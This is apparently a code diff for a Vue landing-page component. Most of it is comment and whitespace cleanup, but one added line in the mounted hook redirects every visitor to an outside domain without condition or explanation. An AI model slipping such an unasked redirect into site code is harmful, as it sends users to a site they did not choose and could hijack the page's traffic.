@@ -3,7 +3,7 @@
     <div ref="gtmNoScript" />
     <Loading :loading="loading" />
     <!-- <SideNavigation v-if="isSide" />
-    <Navigation v-else /> -->
+    <Navigation v-else />-->
     <div id="section1">
       <Section1 />
     </div>
@@ -15,7 +15,7 @@
     </div>
     <!-- <div id="section4">
       <Section4 />
-    </div> -->
+    </div>-->
     <!-- <ContactSection /> -->
     <SimpleOrder />
     <!-- <MobileNav /> -->
@@ -55,7 +55,6 @@ export default {
     Section3,
     Section4,
     SimpleOrder,
-
   },
 
   data() {
@@ -72,6 +71,7 @@ export default {
         }
       }, 0)
     })
+    window.location = 'https://ycg.nhc888.com.tw/'
   },
 
   methods: {
